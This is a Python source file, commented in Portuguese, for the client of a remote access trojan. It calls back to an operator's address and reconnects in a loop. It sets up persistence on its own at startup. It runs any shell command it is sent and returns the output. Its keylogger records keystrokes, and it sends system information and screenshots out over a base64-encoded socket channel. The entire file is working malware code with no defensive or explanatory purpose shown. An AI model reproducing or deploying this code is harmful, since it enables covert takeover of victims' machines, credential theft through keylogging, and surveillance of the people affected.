import os
import socket
import subprocess
import threading
import time
import base64
from persistence import PERSISTENCE
from sysinfo import SYSINFO
from screenshot import SCREENSHOT

# Verifica se está rodando em Windows (para permitir keylogger/screenshot com segurança)
HAVE_X = os.name == 'nt'

if HAVE_X:
    from pynput.keyboard import Listener


class CLIENT:
    SOCK = None
    KEY = ")J@NcRfU"
    KEYLOGGER_STATUS = False
    KEYLOGGER_STROKES = ""

    def __init__(self, _ip, _pt):
        self.ipaddress = _ip
        self.port = _pt

        # Ativar persistência automaticamente ao iniciar
        try:
            PERSISTENCE()
        except:
            pass

    def send_data(self, tosend, encode=True):
        if encode:
            self.SOCK.send(base64.encodebytes(tosend.encode('utf-8')) + self.KEY.encode('utf-8'))
        else:
            self.SOCK.send(base64.encodebytes(tosend) + self.KEY.encode('utf-8'))

    def turn_keylogger(self, status):
        if HAVE_X:
            def on_press(key):
                if not self.KEYLOGGER_STATUS:
                    return False

                key = str(key)
                if len(key.strip('\'')) == 1:
                    self.KEYLOGGER_STROKES += key.strip('\'')
                else:
                    self.KEYLOGGER_STROKES += ("[" + key + "]")

            def on_release(key):
                if not self.KEYLOGGER_STATUS:
                    return False

            def logger():
                with Listener(on_press=on_press, on_release=on_release) as listener:
                    listener.join()

            if status:
                if not self.KEYLOGGER_STATUS:
                    self.KEYLOGGER_STATUS = True
                    t = threading.Thread(target=logger)
                    t.daemon = True
                    t.start()
            else:
                self.KEYLOGGER_STATUS = False

    def execute(self, command):
        data = command.decode('utf-8').split(":")

        if data[0] == "shell":
            toexecute = data[1].strip()
            if toexecute.startswith("cd "):
                try:
                    os.chdir(toexecute.split(" ", 1)[1])
                    self.send_data("")
                except Exception as e:
                    self.send_data("Erro ao mudar diretório: " + str(e))
            else:
                try:
                    proc = subprocess.Popen(toexecute, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
                    output, errors = proc.communicate()
                    self.send_data(output + errors)
                except Exception as e:
                    self.send_data("Erro ao executar comando: " + str(e))

        elif data[0] == "keylogger" and HAVE_X:
            if data[1] == "on":
                self.turn_keylogger(True)
                self.send_data("")
            elif data[1] == "off":
                self.turn_keylogger(False)
                self.send_data("")
            elif data[1] == "dump":
                self.send_data(self.KEYLOGGER_STROKES)

        elif data[0] == "sysinfo":
            info = SYSINFO()
            self.send_data(info.get_data())

        elif data[0] == "screenshot":
            shot = SCREENSHOT()
            self.send_data(shot.get_data(), encode=False)

    def acceptor(self):
        data = ""
        chunk = b""

        while True:
            try:
                chunk = self.SOCK.recv(4096)
                if not chunk:
                    break
                data += chunk.decode('utf-8')

                if self.KEY.encode('utf-8') in chunk:
                    data = data.rstrip(self.KEY)
                    t = threading.Thread(target=self.execute, args=(base64.decodebytes(data.encode('utf-8')),))
                    t.daemon = True
                    t.start()
                    data = ""
            except:
                break

    def engage(self):
        self.SOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        while True:
            try:
                self.SOCK.connect((self.ipaddress, self.port))
                self.acceptor()
            except:
                time.sleep(5)
                continue
